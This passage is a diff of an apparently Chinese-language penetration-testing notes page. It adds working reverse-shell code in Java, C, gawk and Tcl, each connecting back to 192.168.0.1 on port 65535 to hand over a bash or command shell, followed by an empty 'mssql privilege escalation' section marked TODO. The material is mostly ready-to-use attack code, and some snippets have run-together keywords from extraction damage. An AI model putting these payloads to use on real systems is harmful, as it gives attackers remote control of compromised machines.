+<h3 id="java">java<a class="headerlink" href="#java" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="n">classRevs</span><span class="p">{</span>
+    <span class="cm">/**</span>
+<span class="cm">    * @param args</span>
+<span class="cm">    * @throws Exception </span>
+<span class="cm">    */</span>
+    <span class="n">publicstaticvoidmain</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="c1">// TODO Auto-generated method stub</span>
+        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span>
+        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="p">{</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/192.168.0.1/65535;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="p">};</span>
+        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+        <span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="c">c<a class="headerlink" href="#c" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp"></span>
+<span class="n">voidusage</span><span class="p">();</span>
+<span class="kt">char</span> <span class="n">shell</span><span class="p">[]</span><span class="o">=</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">message</span><span class="p">[]</span><span class="o">=</span><span class="s">&quot;hacker welcome</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">sock</span><span class="p">;</span>
+<span class="n">intmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span><span class="mi">3</span><span class="p">){</span>
+    <span class="n">usage</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="mi">-1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Couldn&#39;t make socket!n&quot;</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">65535</span><span class="p">);</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;192.168.0.1&quot;</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="p">))</span> <span class="o">==</span> <span class="mi">-1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Could not connect to remote shell!n&quot;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">message</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">execl</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">voidusage</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">prog</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;reflect ip&gt; &lt;port&gt;n&quot;</span><span class="p">,</span> <span class="n">prog</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div>
+<h3 id="gawk">gawk<a class="headerlink" href="#gawk" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nb">BEGIN</span><span class="p">{</span>
+    <span class="nx">s</span><span class="o">=</span><span class="s2">&quot;/inet/tcp/0/192.168.0.1/65535&quot;</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+        <span class="k">do</span><span class="p">{</span>
+            <span class="nx">s</span><span class="o">|</span><span class="err">&amp;</span><span class="kr">getline</span> <span class="nx">c</span><span class="p">;</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">c</span><span class="p">){</span>
+                <span class="k">while</span><span class="p">((</span><span class="nx">c</span><span class="o">|</span><span class="err">&amp;</span><span class="kr">getline</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span>
+                    <span class="kr">print</span> <span class="o">$</span><span class="mi">0</span><span class="o">|</span><span class="err">&amp;</span><span class="nx">s</span><span class="p">;</span>
+                    <span class="kr">close</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">while</span><span class="p">(</span><span class="nx">c</span><span class="o">!=</span><span class="s2">&quot;exit&quot;</span><span class="p">);</span>
+        <span class="kr">close</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="tcl">tcl<a class="headerlink" href="#tcl" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="k">set</span> s <span class="k">[</span><span class="nb">socket</span> <span class="mf">192.168</span>.0.1 <span class="mi">65535</span><span class="k">];</span>
+<span class="k">while</span> <span class="mi">42</span> <span class="k">{</span>
+    <span class="nb">puts</span> <span class="o">-</span>nonewline <span class="nv">$s</span> <span class="s2">&quot;shell&gt;&quot;</span><span class="k">;</span>
+    <span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span>
+    <span class="nb">gets</span> <span class="nv">$s</span> c<span class="k">;</span>
+    <span class="k">set</span> e <span class="s2">&quot;exec $c&quot;</span><span class="k">;</span>
+    <span class="k">if</span> <span class="k">{</span><span class="o">!</span><span class="k">[catch</span> <span class="k">{set</span> r <span class="k">[eval</span> <span class="nv">$e</span><span class="k">]}</span> err<span class="k">]}</span> <span class="k">{</span>
+        <span class="nb">puts</span> <span class="nv">$s</span> <span class="nv">$r</span> 
+        <span class="k">};</span>
+        <span class="nb">flush</span> <span class="nv">$s</span><span class="k">;</span>
+    <span class="k">};</span> 
+    <span class="nb">close</span> <span class="nv">$s</span><span class="k">;</span>
 </code></pre></div>
 <h2 id="mssql">mssql 提权<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h2>
 <p>TODO</p>
@@ -3845,7 +4266,7 @@ KB2592799→ MS11-080
     <script id="__config" type="application/json">{"base": "../..", "features": ["tabs"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../../assets/javascripts/workers/search.217ffd95.min.js", "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.926459b3.min.js"></script>
+      <script src="../../assets/javascripts/bundle.6e8eee23.min.js"></script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
